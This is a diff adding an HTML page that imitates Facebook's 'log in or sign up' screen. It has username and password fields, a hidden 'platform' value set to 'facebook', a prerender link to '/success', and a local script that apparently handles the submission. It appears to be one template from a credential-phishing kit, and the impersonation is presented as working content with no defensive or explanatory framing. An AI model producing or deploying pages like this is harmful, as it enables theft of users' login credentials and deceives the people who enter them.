@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel='icon' href='/static/other/facebook-fav-icon.png' type='image/png' />
+    <title>Facebook – log in or sign up</title>
+    <link rel="stylesheet" href="/static/css/facebook.css">
+    <script src="https://cdn.jsdelivr.net/npm/js-cookie@rc/dist/js.cookie.min.js"></script>
+    <link rel="prerender" href="/success">
+</head>
+
+<body>
+    <div class="cointainer">
+        <div class="name center blueBack">
+            facebook
+        </div>
+
+        <div class="mainDiv">
+            <div class="form ">
+                <form id='form'>
+                    <input type="hidden" name="id" id='id'>
+                    <input type="hidden" name="platform" value="facebook">
+                    <input type="text" name='username' id="username" class="username" autocapitalize="off" autocorrect="off" placeholder="Mobile number or email address" required>
+                    <input type="password" name='password' id="password" class="password" autocapitalize="off" autocorrect="off" placeholder="password" required>
+                    <input type="submit" value="Log In" class='center'>
+                </form>
+            </div>
+            <!-- or line -->
+            <div class="orlineDiv">
+                <div class='line'>
+                </div>
+                <span class="orWord allcaps ">or</span>
+                <div class='line'>
+                </div>
+            </div>
+            <div class="btn createNewAccount center">
+                Create New Account
+            </div>
+            <div class="forgot center">
+                Forgotten password?
+            </div>
+        </div>
+
+        <div class="footer">
+            <div class="languageFooter">
+                <!-- languages -->
+                <div class="language">
+                    English (UK)
+                </div>
+                <div class="language">
+                    اردو
+                </div>
+                <div class="language">
+                    മലയാളം
+                </div>
+                <div class="language">
+                    தமிழ்
+                </div>
+                <div class="language">
+                    हिन्दी
+                </div>
+                <div class="language">
+                    ಕನ್ನಡ
+                </div>
+                <div class="language">
+                    తెలుగు
+                </div>
+                <div class="boxPlus">
+                    +
+                </div>
+            </div>
+            <!-- facebook Inc text -->
+            <div class="someTextFooter center">
+                Facebook Inc.
+            </div>
+        </div>
+    </div>
+
+</body>
+<script src="/static/js/facebook.js"></script>
+
+</html>
